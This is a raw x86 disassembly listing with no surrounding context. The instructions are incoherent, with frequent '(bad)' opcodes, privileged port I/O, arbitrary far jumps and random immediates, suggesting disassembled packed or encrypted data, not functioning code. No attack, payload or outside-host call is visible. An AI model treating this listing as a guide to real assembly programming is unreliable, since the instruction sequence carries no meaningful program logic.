  414b41:	retf   
  414b42:	cli    
  414b43:	pop    ss
  414b44:	dec    ecx
  414b45:	mov    edi,0x9cdbde6a
  414b4a:	outs   dx,DWORD PTR ds:[esi]
  414b4b:	fnstcw WORD PTR [ebx-0x3]
  414b4e:	test   bh,bh
  414b50:	xor    edx,esp
  414b52:	fisttp QWORD PTR [edi+0x17521aa8]
  414b58:	mov    esp,0xe08d9c2b
  414b5d:	shr    BYTE PTR [edx-0x73094b74],0x7f
  414b64:	gs jae 0x414afc
  414b67:	inc    ecx
  414b68:	mov    ch,0x3d
  414b6a:	retf   
  414b6b:	test   BYTE PTR [edx],0xbe
  414b6e:	or     DWORD PTR [eax+0x70791b0],0xffffffa4
  414b75:	jp     0x414b61
  414b77:	mov    esi,0xd8c18251
  414b7c:	imul   ebx,DWORD PTR [ebx],0x7decdf14
  414b82:	rol    BYTE PTR [ebp-0x2828e30e],cl
  414b88:	sahf   
  414b89:	mov    ecx,0xfd82b14e
  414b8e:	retf   0xe9f2
  414b91:	scas   eax,DWORD PTR es:[edi]
  414b92:	and    esi,DWORD PTR [ebp+0x538a7645]
  414b98:	(bad)  
  414b99:	xchg   edi,eax
  414b9a:	cmp    ah,BYTE PTR [ebx+0x7c]
  414b9d:	adc    dh,BYTE PTR [esi-0x54ad95e5]
  414ba3:	pop    ebx
  414ba4:	jbe    0x414c19
  414ba6:	(bad)  
  414ba7:	mov    BYTE PTR [esi],cl
  414ba9:	idiv   BYTE PTR [ecx-0x7463e217]
  414baf:	ja     0x414bca
  414bb1:	mov    ebx,0xf5353a96
  414bb6:	pop    esi
  414bb7:	push   ebp
  414bb8:	call   0x724:0x885ff97c
  414bbf:	fsubr  QWORD PTR [ebp+0x1c]
  414bc2:	test   al,bl
  414bc4:	pop    es
  414bc5:	dec    edx
  414bc6:	push   esi
  414bc7:	mov    edi,0xf39278a5
  414bcc:	sbb    ch,BYTE PTR [eax+0x6ba72dc8]
  414bd2:	fst    DWORD PTR [ebp+0x46]
  414bd5:	jle    0x414c2b
  414bd7:	rcl    BYTE PTR [ebx],cl
  414bd9:	xchg   BYTE PTR [ecx+0x5f],cl
  414bdc:	fadd   DWORD PTR [esp+edi*1-0x5eb4d3cf]
  414be3:	cs out 0xfa,eax
  414be6:	fstp   QWORD PTR [edi+0x600ee9ea]
  414bec:	and    DWORD PTR [edi-0x28b6dee9],0x894e153d
  414bf6:	mov    al,0xa5
  414bf8:	pop    edi
  414bf9:	in     al,dx
  414bfa:	das    
  414bfb:	repz es jl 0x414c29
  414bff:	into   
  414c00:	popf   
  414c01:	shl    al,0x2c
  414c04:	and    eax,0x914c0f8d
  414c09:	ds sbb ah,ch
  414c0c:	je     0x414c33
  414c0e:	add    edx,edx
  414c10:	cld    
  414c11:	mov    BYTE PTR [ebp+0x149a73c1],bl
  414c17:	in     al,0x7
  414c19:	cli    
  414c1a:	in     eax,0x84
  414c1c:	fucompp 
  414c1e:	jns    0x414c2b
  414c20:	std    
  414c21:	jmp    0x414c6c
  414c23:	retf   
  414c24:	cmp    BYTE PTR [ebx*4+0x4e316ee0],dh
  414c2b:	pop    ecx
  414c2c:	(bad)  
  414c2e:	pop    edi
  414c2f:	stc    
  414c30:	and    DWORD PTR [ecx-0x15ccd0e0],esp
  414c36:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414c37:	shr    DWORD PTR [esi+0x55],0xb8
  414c3b:	(bad)  
  414c3c:	pop    es
  414c3d:	ja     0x414c82
  414c3f:	ret    
  414c40:	xchg   ebp,esi
  414c42:	fs test eax,0x6f475f95
  414c48:	jp     0x414c19
  414c4a:	add    ch,bl
  414c4c:	sbb    BYTE PTR [ebp-0x238de5ff],ch
  414c52:	ins    BYTE PTR es:[edi],dx
  414c53:	jecxz  0x414be1
  414c55:	cdq    
  414c56:	dec    eax
  414c57:	push   esi
  414c58:	hlt    
  414c59:	push   ss
  414c5a:	mov    bl,0xef
  414c5c:	clc    
  414c5d:	int3   
  414c5e:	add    ebp,DWORD PTR [esi]
  414c60:	pop    ebx
  414c61:	mov    esi,0xc6728c20
  414c66:	cdq    
  414c67:	loop   0x414c61
  414c69:	int3   
  414c6a:	inc    ebp
  414c6b:	pop    ebp
  414c6c:	repz jle 0x414c36
  414c6f:	mov    ch,0x76
  414c71:	cwde   
  414c72:	lods   al,BYTE PTR ds:[esi]
  414c73:	adc    cl,bh
  414c75:	xchg   edi,eax
  414c76:	inc    esi
  414c77:	(bad)
  414c7b:	(bad)  ds:[esi+0x728fefa1]
  414c82:	mov    al,ds:0xdc6e48ab
  414c87:	mov    ah,0x61
  414c89:	lods   eax,DWORD PTR ds:[esi]
  414c8a:	xor    edx,edx
  414c8c:	mov    ch,0x6c
  414c8e:	scas   al,BYTE PTR es:[edi]
  414c8f:	sbb    al,0xf7
  414c91:	enter  0x558,0x3b
  414c95:	and    cl,bl
  414c97:	dec    ebx
  414c98:	inc    edx
  414c99:	aad    0xd
  414c9b:	sub    bh,BYTE PTR [edx+0x6b]
  414c9e:	xchg   BYTE PTR [ecx+ebx*2+0x19],dh
  414ca2:	sub    eax,0x1ef2a2e7
  414ca7:	jne    0x414c5c
  414ca9:	loopne 0x414cfb
  414cab:	test   eax,0x52bb7099
  414cb0:	mov    eax,0xe36434c9
  414cb5:	xor    BYTE PTR [esi-0x37],0xf8
  414cb9:	icebp  
  414cba:	aaa    
  414cbb:	and    esp,DWORD PTR [edi+0x79bec7c5]
  414cc1:	clc    
  414cc2:	jns    0x414c85
  414cc4:	scas   al,BYTE PTR es:[edi]
  414cc5:	mov    al,ds:0x7ec073b6
  414cca:	or     DWORD PTR [edi],eax
  414ccc:	add    cl,BYTE PTR [ebx+edx*1]
  414ccf:	xchg   edi,eax
  414cd0:	iret   
  414cd1:	xor    edx,ebp
  414cd3:	cwde   
  414cd4:	xor    al,0xff
  414cd6:	jge    0x414c61
  414cd8:	mov    eax,ds:0x7cddae38
  414cdd:	pop    ecx
  414cde:	inc    esp
  414cdf:	inc    esp
  414ce0:	xchg   ebx,eax
  414ce1:	sub    ebx,DWORD PTR ds:0x4cfdbcc3
  414ce7:	cmp    esi,0x10e8c82d
  414ced:	sahf   
  414cee:	cmp    BYTE PTR [ebp-0x5610a29c],0x19
  414cf5:	xchg   esp,eax
  414cf6:	inc    eax
  414cf7:	scas   eax,DWORD PTR es:[edi]
  414cf8:	repz popf 
  414cfa:	cmp    eax,0x70be9c86
  414cff:	jo     0x414c83
  414d01:	jmp    0x414cbb
  414d03:	ss mov cl,0x28
  414d06:	and    DWORD PTR ds:0x796700a5,0xc32bf794
  414d10:	inc    edx
  414d11:	out    dx,al
  414d12:	add    al,0x6b
  414d14:	or     edx,esi
  414d16:	xor    bl,dh
  414d18:	xor    edx,DWORD PTR [eax]
  414d1a:	pop    edi
  414d1b:	jnp    0x414d77
  414d1d:	(bad)  
  414d1e:	mov    ecx,0x9999a91f
  414d23:	(bad)  
  414d25:	dec    ebp
  414d26:	shl    DWORD PTR [ebp-0x54444394],cl
  414d2c:	add    bl,BYTE PTR [ecx-0x5c]
  414d2f:	mov    cl,0x51
  414d31:	ja     0x414d0b
  414d33:	fisub  WORD PTR [eax+0x3806474a]
  414d39:	fsub   QWORD PTR [ebx+0x132d3254]
  414d3f:	push   edx
  414d40:	push   ds
  414d41:	jae    0x414db1
  414d43:	adc    eax,0x7c60f25f
  414d48:	add    edx,eax
  414d4a:	ins    DWORD PTR es:[edi],dx
  414d4b:	iret   
  414d4c:	or     al,0x6e
  414d4e:	jmp    0xdcf9:0x969d4365
  414d55:	lods   al,BYTE PTR ds:[esi]
  414d56:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414d57:	shl    bh,0x95
  414d5a:	les    esp,FWORD PTR [ebx-0x10]
  414d5d:	cwde   
  414d5e:	test   DWORD PTR [edx-0x4df0f897],eax
  414d64:	mov    ebx,0x862973ab
  414d69:	call   DWORD PTR [edx+0x77]
  414d6c:	cld    
  414d6d:	adc    BYTE PTR [edi+0x17e827c9],bh
  414d73:	push   es
  414d74:	aaa    
  414d75:	cld    
  414d76:	js     0x414d6f
  414d78:	xchg   esp,eax
  414d79:	loop   0x414dca
  414d7b:	push   cs
  414d7c:	rcr    BYTE PTR gs:[ebx-0x28ead5ea],cl
  414d83:	mov    edi,0x3e5ce965
  414d88:	(bad)  
  414d89:	xor    edx,edx
  414d8b:	outs   dx,BYTE PTR ds:[esi]
  414d8c:	or     eax,0xc55f2745
  414d91:	and    al,0x83
  414d93:	sbb    BYTE PTR [ebx+0x33],al
  414d96:	data16 int3 
  414d98:	add    al,0xc
  414d9a:	pop    ds
  414d9b:	push   esi
  414d9c:	addr16 dec edi
  414d9e:	mov    BYTE PTR [edi],bh
  414da0:	aad    0x8e
  414da2:	jp     0x414d3a
  414da4:	gs out 0xcb,eax
  414da7:	inc    ebx
  414da8:	dec    esp
  414da9:	fs aas 
  414dab:	inc    DWORD PTR ds:[esi-0x1ae6d445]
  414db2:	ja     0x414d8f
  414db4:	ret    
  414db5:	fsub   DWORD PTR [eax-0x7d237d0b]
  414dbb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414dbc:	or     BYTE PTR [ebp+0x19],dh
  414dbf:	neg    dh
  414dc1:	leave  
  414dc2:	imul   esi,DWORD PTR [edi+0x7afecadc],0x7
  414dc9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414dca:	mov    ah,0x86
  414dcc:	jge    0x414d8c
  414dce:	push   ss
  414dcf:	sub    al,0x2d
  414dd1:	pop    ds
  414dd2:	jo     0x414e51
  414dd4:	inc    edx
  414dd5:	and    eax,0x7e6b7094
  414dda:	add    bl,BYTE PTR [edx]
  414ddc:	push   ss
  414ddd:	or     al,0x40
  414ddf:	out    dx,al
  414de0:	push   ebx
  414de1:	cdq    
  414de2:	in     eax,0x32
  414de4:	data16 jae 0x414dae
  414de7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414de8:	std    
  414de9:	cmp    eax,0x1d3800df
  414dee:	adc    al,0xeb
  414df0:	push   edx
  414df1:	push   es
  414df2:	sti    
  414df3:	out    dx,eax
  414df4:	ds push 0x47
  414df7:	jmp    0x414e35
  414df9:	and    cl,cl
  414dfb:	xchg   esi,eax
  414dfc:	sbb    al,0xfd
  414dfe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414dff:	jns    0x414e56
  414e01:	mov    eax,0x6562c9be
  414e06:	or     BYTE PTR [ecx],dl
  414e08:	adc    al,0x4c
  414e0a:	clc    
  414e0b:	daa    
  414e0c:	mov    bl,0x5e
  414e0e:	add    bl,BYTE PTR [ecx-0x6d]
  414e11:	pushf  
  414e12:	mov    ds:0xa5b45a40,eax
  414e17:	fistp  QWORD PTR [ebx]
  414e19:	dec    BYTE PTR [edx-0x68]
  414e1c:	mov    eax,ds:0xcbdb6c0d
  414e21:	pop    edi
  414e22:	not    BYTE PTR [ebp-0x5a]
  414e25:	and    DWORD PTR [ecx-0x4b363a67],eax
  414e2b:	xor    eax,0xf3de267d
  414e30:	mov    eax,ds:0x3ceeced4
  414e35:	in     al,dx
  414e36:	pop    esi
  414e37:	outs   dx,DWORD PTR ds:[esi]
  414e38:	push   edi
  414e39:	leave  
  414e3a:	in     eax,0xcf
  414e3c:	cmp    edx,eax
  414e3e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414e3f:	out    0xac,al
  414e41:	rcr    DWORD PTR ds:0x938c58ef,cl
  414e47:	rcr    DWORD PTR [esi+0x215a2482],0x81
  414e4e:	push   cs
  414e4f:	iret   
  414e50:	push   ss
  414e51:	fidiv  DWORD PTR [esi+0x4b]
  414e54:	mov    ah,0x7a
  414e56:	and    eax,0xe59bdb13
  414e5b:	pop    ss
  414e5c:	jb     0x414e1a
  414e5e:	jnp    0x414ec3
  414e60:	xchg   esi,eax
  414e61:	shr    DWORD PTR [ebx+0x9d12200],cl
  414e67:	sub    DWORD PTR [eax],eax
  414e69:	push   edx
  414e6a:	mov    dh,0x96
  414e6c:	xlat   BYTE PTR ds:[ebx]
  414e6d:	cli    
  414e6e:	imul   esp,DWORD PTR [ebx+ecx*4+0x2f],0xffffffe9
  414e73:	iret   
  414e74:	cmp    ebx,DWORD PTR [ecx+0xa127afa]
  414e7a:	mov    dl,BYTE PTR [ecx-0x3d]
  414e7d:	lahf   
  414e7e:	add    BYTE PTR [ebx+0x8cbbaae],0xe
  414e85:	or     al,0x8e
  414e87:	dec    eax
  414e88:	pop    ds
  414e89:	imul   ebp,DWORD PTR [edx*2+0x58892635],0xffffffb5
  414e91:	and    DWORD PTR [edx+0xc60128d],esp
  414e97:	jne    0x414e91
  414e99:	pop    ebx
  414e9a:	jge    0x414e89
  414e9c:	jo     0x414ef7
  414e9e:	mov    edx,0xd831dcf
  414ea3:	mov    ebp,0x13da1488
  414ea8:	imul   ebp,DWORD PTR [edi-0x78],0x6c
  414eac:	daa    
  414ead:	or     BYTE PTR [ecx],bh
  414eaf:	arpl   WORD PTR [eax],dx
  414eb1:	mov    gs,WORD PTR [esi-0x69]
  414eb4:	scas   eax,DWORD PTR es:[edi]
  414eb5:	mov    BYTE PTR [esi-0x72e03ce6],dl
  414ebb:	inc    edi
  414ebc:	xchg   esi,eax
  414ebd:	addr16 adc eax,0xad7c779b
  414ec3:	dec    ebx
  414ec4:	lea    eax,[esi+eax*2-0x7402039a]
  414ecb:	jle    0x414eb1
  414ecd:	xor    BYTE PTR [edi],al
  414ecf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414ed0:	repz addr16 inc esp
  414ed3:	push   cs
  414ed4:	jmp    0x414ee3
  414ed6:	leave  
  414ed7:	js     0x414eb3
  414ed9:	(bad)  
  414edb:	push   esi
  414edc:	sub    ebp,esp
  414ede:	mov    dl,0xa8
  414ee0:	out    0xe,eax
  414ee2:	sbb    DWORD PTR [ebx],esp
  414ee4:	sbb    DWORD PTR [ecx+0x2d],edi
  414ee7:	ror    DWORD PTR ds:0x26e51226,1
  414eed:	ss aam 0x72
  414ef0:	sub    al,0x6
  414ef2:	adc    DWORD PTR [eax],edi
  414ef4:	hlt    
  414ef5:	jmp    0x424786d7
  414efa:	or     al,0xf4
  414efc:	push   ss
  414efd:	mov    ah,0x38
  414eff:	idiv   BYTE PTR [ebx+0x6c31a4a8]
  414f05:	xor    dl,BYTE PTR [edx-0x360fa67]
  414f0b:	mov    bl,0xe8
  414f0d:	pop    esi
  414f0e:	inc    edi
  414f0f:	xchg   bl,ah
  414f11:	xor    al,0x9
  414f13:	mov    ebx,0x7a41ff6d
  414f18:	lods   eax,DWORD PTR ds:[esi]
  414f19:	push   ecx
  414f1a:	leave  
  414f1b:	scas   al,BYTE PTR es:[edi]
  414f1c:	stos   BYTE PTR es:[edi],al
  414f1d:	jl     0x414ee7
  414f1f:	xchg   ebp,eax
  414f20:	jge    0x414f4c
  414f22:	jge    0x414f0f
  414f24:	jle    0x414ef7
  414f26:	add    ah,BYTE PTR [ebx]
  414f28:	clc    
  414f29:	arpl   WORD PTR ds:0x9debe326,ax
  414f2f:	jns    0x414ed6
  414f31:	xchg   esp,eax
  414f32:	pop    ds
  414f33:	adc    ah,BYTE PTR [edi]
  414f35:	pusha  
  414f36:	dec    esp
  414f37:	and    BYTE PTR [ebx],dh
  414f39:	xchg   edx,eax
  414f3a:	test   DWORD PTR [ecx],esp
  414f3c:	mov    dh,0xbf
  414f3e:	and    BYTE PTR [ebx],bh
  414f40:	aad    0xa6
  414f42:	pop    edx
  414f43:	dec    esi
  414f44:	inc    eax
  414f45:	retf   
  414f46:	sbb    DWORD PTR [eax-0x4fff4524],eax
  414f4c:	mov    gs,WORD PTR [edx-0x41818a94]
  414f52:	mov    ds:0xcf4af050,eax
  414f57:	dec    edx
  414f58:	loop   0x414fad
  414f5a:	idiv   DWORD PTR [esi]
  414f5c:	sti    
  414f5d:	rol    BYTE PTR [ebp+0x68e27909],0x48
  414f64:	jge    0x414fb0
  414f66:	int    0x6
  414f68:	jns    0x414fad
  414f6a:	mov    eax,ds:0xbe1189c0
  414f6f:	xor    BYTE PTR [ecx],al
  414f71:	xchg   edx,eax
  414f72:	inc    esp
  414f73:	fimul  WORD PTR [ecx-0x19]
  414f76:	arpl   WORD PTR [edi-0x19c35933],cx
  414f7c:	fcmovnu st,st(4)
  414f7e:	(bad)
  414f81:	fdivr  QWORD PTR [edi-0x25]
  414f84:	xchg   ebp,eax
  414f85:	sbb    DWORD PTR [edi+ebp*2-0x37],edx
  414f89:	push   esi
  414f8a:	cmp    DWORD PTR [edi],ebx
  414f8c:	imul   ebx,DWORD PTR [edx+ebx*8-0xbba86ef],0xce326328
  414f97:	daa    
  414f98:	sbb    eax,DWORD PTR [ecx+ebx*1]
  414f9b:	add    eax,0x8071cbc6
  414fa0:	fs and al,0x2f
  414fa3:	push   ebp
  414fa4:	retf   
  414fa5:	cmp    edi,edx
  414fa7:	fimul  DWORD PTR [edx]
  414fa9:	enter  0x2bd6,0xc2
  414fad:	pop    esi
  414fae:	int3   
  414faf:	dec    esp
  414fb0:	inc    edi
  414fb1:	or     DWORD PTR [edi],0xffffff8c
  414fb4:	add    esi,DWORD PTR [eax]
  414fb6:	hlt    
  414fb7:	pop    esi
  414fb8:	sub    al,0x1d
  414fba:	pop    esi
  414fbb:	jle    0x415021
  414fbd:	cld    
  414fbe:	jnp    0x414fb2
  414fc0:	aad    0x1b
  414fc2:	sbb    al,0xcd
  414fc4:	clc    
  414fc5:	or     eax,0xbc022d4d
  414fca:	ret    
  414fcb:	and    BYTE PTR [eax],ch
  414fcd:	pop    ds
  414fce:	out    0x33,al
  414fd0:	cmp    esp,ecx
  414fd2:	mov    al,0xf1
  414fd4:	addr16 test al,0xd2
  414fd7:	aam    0x40
  414fd9:	aam    0x9c
  414fdb:	les    edx,FWORD PTR [edi+ecx*4]
  414fde:	mov    dh,0xa9
  414fe0:	pop    edx
  414fe1:	and    eax,0x82cd5863
  414fe6:	cs xchg edi,eax
  414fe8:	loopne 0x415029
  414fea:	dec    esp
  414feb:	jno    0x415026
  414fed:	pop    ecx
  414fee:	push   ecx
  414fef:	into   
  414ff0:	or     DWORD PTR [edx+0x40],edi
  414ff3:	mov    edi,0x18d4c475
  414ff8:	stos   BYTE PTR es:[edi],al
  414ff9:	lods   eax,DWORD PTR ds:[esi]
  414ffa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414ffb:	mov    ds:0x71543908,eax
  415000:	lock mov dl,0x8b
  415003:	outs   dx,DWORD PTR ds:[esi]
  415004:	iret   
  415005:	cmp    al,0x65
  415007:	mov    ebp,0xab040e17
  41500c:	int3   
  41500d:	aas    
  41500e:	sbb    BYTE PTR [edi+0x6c],ah
  415011:	test   BYTE PTR [esi],ah
  415013:	pop    esp
  415014:	lahf   
  415015:	cmp    bl,cl
  415017:	fdivrp st(1),st
  415019:	sbb    eax,0x57a8fe7c
  41501e:	fdiv   DWORD PTR [eax+0x5355697]
  415024:	xor    al,0x7d
  415026:	xchg   BYTE PTR [ebx],dl
  415028:	jmp    0x414fbe
  41502a:	das    
  41502b:	retf   
  41502c:	adc    ebx,eax
  41502e:	pusha  
  41502f:	inc    ebx
  415030:	dec    ebx
  415031:	push   ebp
  415032:	pop    ds
  415033:	jbe    0x41502f
  415035:	dec    ebp
  415036:	(bad)  
  415038:	mov    bh,0x68
  41503a:	jno    0x415011
  41503c:	dec    esi
  41503d:	pop    edx
  41503e:	dec    ebp
  41503f:	jecxz  0x4150b0
  415041:	test   BYTE PTR [ebp-0x54],bl
  415044:	jg     0x415019
  415046:	ds mov ch,0x20
  415049:	jle    0x41501b
  41504b:	inc    ecx
  41504c:	aam    0xc4
  41504e:	neg    BYTE PTR [esi+0x71]
  415051:	lods   al,BYTE PTR ds:[esi]
  415052:	imul   eax,ebp,0x53
  415055:	fdivr  st(5),st
  415057:	cmp    eax,0x9850d9bf
  41505c:	ins    DWORD PTR es:[edi],dx
  41505d:	or     ah,bl
  41505f:	xchg   esi,eax
  415060:	call   0x7c717bf8
  415065:	aad    0xcc
  415067:	retf   
  415068:	push   esi
  415069:	and    ch,BYTE PTR [edi+ecx*4-0x66]
  41506d:	push   ds
  41506e:	inc    ecx
  41506f:	xchg   esi,esi
  415071:	(bad)  
  415073:	cmp    BYTE PTR [ecx],dl
  415075:	and    DWORD PTR [eax-0x78],edx
  415078:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415079:	xor    BYTE PTR ds:0xacd2fba2,ah
  41507f:	push   edx
  415080:	lds    edi,FWORD PTR [esi+0x67f8df07]
  415086:	(bad)  
  415087:	fsub   QWORD PTR [ebx]
  415089:	in     al,0x93
  41508b:	inc    edi
  41508c:	or     ch,ch
  41508e:	stos   BYTE PTR es:[edi],al
  41508f:	mov    cl,0x2
  415091:	mov    es,ebx
  415093:	inc    ebx
  415094:	je     0x415080
  415096:	arpl   sp,si
  415098:	jno    0x4150db
  41509a:	push   es
  41509b:	mov    WORD PTR [eax+0x36],gs
  41509e:	and    DWORD PTR [edx+ebp*2],esi
  4150a1:	loop   0x4150bd
  4150a3:	sbb    DWORD PTR [edx+0x55],eax
  4150a6:	xor    eax,0xc1200fe2
  4150ab:	imul   edx,DWORD PTR [edx-0x7d],0xfffffffe
  4150af:	enter  0xe6b9,0x59
  4150b3:	cmp    eax,0xcf2952b6
  4150b8:	mov    esp,0x76caff5c
  4150bd:	mov    ebp,0xb2f31353
  4150c2:	push   cs
  4150c3:	add    ebx,DWORD PTR [edx]
  4150c5:	arpl   bp,bp
  4150c7:	jno    0x415126
  4150c9:	inc    esp
  4150ca:	jmp    0xbc64:0xbcf8e372
  4150d1:	es jne 0x41514f
  4150d4:	xchg   edx,eax
  4150d5:	cdq    
  4150d6:	lods   eax,DWORD PTR ds:[esi]
  4150d7:	enter  0xac53,0xd6
  4150db:	and    eax,0x22e743f1
  4150e0:	fisttp WORD PTR [eax-0x70]
  4150e3:	out    0xba,al
  4150e5:	mov    ah,0xb3
  4150e7:	retf   
  4150e8:	clc    
  4150e9:	je     0x4150d6
  4150eb:	arpl   di,di
  4150ed:	push   ebx
  4150ee:	inc    ebx
  4150ef:	xor    eax,0x34127aa1
  4150f4:	xchg   edi,eax
  4150f5:	inc    ebx
  4150f6:	pusha  
  4150f7:	ins    BYTE PTR es:[edi],dx
  4150f8:	scas   al,BYTE PTR es:[edi]
  4150f9:	xchg   edi,eax
  4150fa:	adc    esi,DWORD PTR [esi+ebp*1-0xefbd09e]
  415101:	(bad)  
  415102:	rcr    DWORD PTR [edi+0x12b95522],0x53
  415109:	scas   eax,DWORD PTR es:[edi]
  41510a:	shl    BYTE PTR [edx-0x52],1
  41510d:	scas   eax,DWORD PTR es:[edi]
  41510e:	retf   
  41510f:	push   edx
  415110:	push   edi
  415111:	loope  0x415100
  415113:	cmp    al,0x1c
  415115:	rcr    BYTE PTR [esi-0xb],cl
  415118:	(bad)  
  415119:	(bad)  
  41511a:	cdq    
  41511b:	iret   
  41511c:	sub    eax,0x27fef05f
  415121:	inc    edx
  415122:	test   dh,cl
  415124:	cmp    edi,esp
  415126:	pop    eax
  415127:	or     al,0xe1
  415129:	push   ebx
  41512a:	xor    eax,0x3ee2d6f3
  41512f:	retf   
  415130:	push   0xbe2d6e1d
  415135:	icebp  
  415136:	jae    0x415107
  415138:	loopne 0x4150cb
  41513a:	mov    cl,0x97
  41513c:	sbb    eax,0xfa8e60cf
  415141:	or     BYTE PTR [edi+esi*1+0x464e9a2c],bh
  415148:	int3   
  415149:	dec    esp
  41514a:	in     eax,0x19
  41514c:	adc    DWORD PTR [ecx+0x74],0x74c2842d
  415153:	out    0x88,al
  415155:	lds    ebx,FWORD PTR [ecx]
  415157:	fld    DWORD PTR [eax]
  415159:	sar    BYTE PTR [ebx-0x3d],0x91
  41515d:	push   esp
  41515e:	jne    0x4151ce
  415160:	xchg   BYTE PTR [ecx],dh
  415162:	xchg   BYTE PTR [ebx-0x284f8235],dl
  415168:	shr    DWORD PTR [ecx],cl
  41516a:	pop    edi
  41516b:	fstp   TBYTE PTR [edi]
  41516d:	sbb    BYTE PTR [eax+0x5c],dl
  415170:	mov    cl,0x73
  415172:	test   al,0xf7
  415174:	(bad)  
  415175:	leave  
  415176:	fcomp  st(5)
  415178:	xchg   edi,eax
  415179:	test   BYTE PTR [ebx],ch
  41517b:	dec    ebx
  41517c:	adc    al,0x14
  41517e:	dec    eax
  41517f:	mov    bl,0x1c
  415181:	jns    0x4151df
  415183:	arpl   WORD PTR [ebp-0x54],sp
  415186:	idiv   BYTE PTR [esi+esi*1]
  415189:	fiadd  WORD PTR [edi+0x2ccbc9d1]
  41518f:	repz inc eax
  415192:	xor    al,BYTE PTR [edi]
  415194:	js     0x4151b0
  415196:	fs (bad) 
  415198:	sbb    ebp,DWORD PTR [eax+0x7e]
  41519b:	inc    ebp
  41519c:	xor    eax,0x62941470
  4151a1:	sti    
  4151a2:	(bad)  
  4151a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4151a4:	inc    ebx
  4151a5:	cmp    DWORD PTR [edi+0x60],ebp
  4151a8:	sbb    eax,0xd6e0e4c5
  4151ad:	test   eax,0x44c1c371
  4151b2:	int    0x8b
  4151b4:	sbb    BYTE PTR [esi-0x1ea3c060],al
  4151ba:	sbb    edx,DWORD PTR [eax+eiz*4+0x47]
  4151be:	push   edi
  4151bf:	fst    DWORD PTR [esi+0x23]
  4151c2:	stos   BYTE PTR es:[edi],al
  4151c3:	sbb    al,0x83
  4151c5:	sub    dh,BYTE PTR [bx]
  4151c8:	push   0xd8282b7a
  4151cd:	sub    al,0xac
  4151cf:	shl    BYTE PTR [esi+eax*4+0x783416f4],1
  4151d6:	adc    dl,al
  4151d8:	in     eax,0x52
  4151da:	fistp  QWORD PTR [edi-0x6d1dbfe1]
  4151e0:	add    BYTE PTR [ebx],dh
  4151e2:	push   0x52
  4151e4:	rcl    BYTE PTR [edi+0x3],0xaa
  4151e8:	jge    0x415230
  4151ea:	loop   0x41517a
  4151ec:	add    eax,0x3bcf938b
  4151f1:	imul   edx,DWORD PTR [eax-0x7],0x66526f3a
  4151f8:	pop    ebp
  4151f9:	dec    eax
  4151fa:	jmp    0x415183
  4151fc:	jo     0x415225
  4151fe:	aam    0xee
  415200:	enter  0xc81,0x7f
  415204:	in     al,dx
  415205:	xchg   edi,eax
  415206:	gs or  ebx,eax
  415209:	pop    ds
  41520a:	fstp   st(4)
  41520c:	mulps  xmm0,XMMWORD PTR [ebx]
  41520f:	add    eax,0x2cb43afd
  415214:	cld    
  415215:	daa    
  415216:	mov    ebx,DWORD PTR [edx+eiz*2]
  415219:	cmc    
  41521a:	pop    edi
  41521b:	loop   0x4151e5
  41521d:	inc    esi
  41521e:	les    ebx,FWORD PTR [esi+0x631ca22e]
  415224:	dec    ebx
  415225:	sub    DWORD PTR [edi+0x19],ecx
  415228:	cmp    eax,0xf765f5c0
  41522d:	mov    edi,0xecfa06d0
  415232:	xchg   ebp,eax
  415233:	js     0x4151fd
  415235:	add    BYTE PTR [ecx],dh
  415237:	enter  0xd0d9,0x59
  41523b:	rcl    DWORD PTR [edi+0x558ef216],cl
  415241:	sub    ebx,ebp
  415243:	(bad)  
  415244:	mov    dh,0x6b
  415246:	dec    eax
  415247:	repz cmp BYTE PTR [edx-0x5c],0x1c
  41524c:	std    
  41524d:	sub    eax,0xfa4d87ce
  415252:	clc    
  415253:	and    dh,BYTE PTR [ecx+esi*4-0x77]
  415257:	out    dx,al
  415258:	les    ebx,FWORD PTR [edi+0x49]
  41525b:	jmp    0x83331a10
  415260:	inc    eax
  415261:	test   eax,0xf92d468e
  415266:	mov    al,ds:0xc5b7e534
  41526b:	xchg   ebp,eax
  41526c:	add    ecx,DWORD PTR [esi+0x419560d9]
  415272:	test   BYTE PTR [ecx+0x35bdcdb8],0x33
  415279:	fst    DWORD PTR [esi+0x51]
  41527c:	sub    DWORD PTR [ebx+esi*4+0x50],edi
  415280:	into   
  415281:	adc    ebx,esi
  415283:	jg     0x41521a
  415285:	data16 adc al,0xc9
  415288:	ss stos BYTE PTR es:[edi],al
  41528a:	mov    bl,0xc2
  41528c:	or     esi,ebx
  41528e:	fistp  DWORD PTR [ebp+0x3e]
  415291:	xor    eax,0x10
  415294:	out    0x99,al
  415296:	pop    ecx
  415297:	cdq    
  415298:	cmp    BYTE PTR [esi-0x14],cl
  41529b:	jno    0x415230
  41529d:	mov    bl,0x3a
  41529f:	and    bh,ch
  4152a1:	jp     0x415264
  4152a3:	mov    ah,0x5d
  4152a5:	cmp    DWORD PTR [esi],edx
  4152a7:	pop    ebp
  4152a8:	shl    BYTE PTR [ebp+0x2e],0xfd
  4152ac:	add    DWORD PTR [eax],ecx
  4152ae:	xchg   esp,eax
  4152af:	push   esi
  4152b0:	bound  ebp,QWORD PTR [edx]
  4152b2:	push   ebx
  4152b3:	and    DWORD PTR [ebp-0x2df5c98e],ebx
  4152b9:	cmp    eax,0x967162d0
  4152be:	(bad)  
  4152bf:	popw   ds
  4152c1:	mov    al,BYTE PTR [edi+eiz*1]
  4152c4:	dec    esp
  4152c5:	add    DWORD PTR [si],0x63
  4152c9:	(bad)  
  4152ca:	(bad)  
  4152cb:	sub    DWORD PTR [edx-0x2c],ecx
  4152ce:	outs   dx,BYTE PTR ds:[esi]
  4152cf:	adc    al,0xd9
  4152d1:	call   0x13ebaa86
  4152d6:	shl    BYTE PTR [esi],cl
  4152d8:	mov    ebx,0x693974f0
  4152dd:	dec    esi
  4152de:	lods   al,BYTE PTR ds:[esi]
  4152df:	out    dx,al
  4152e0:	(bad)  
  4152e1:	pop    eax
  4152e2:	jne    0x4152a3
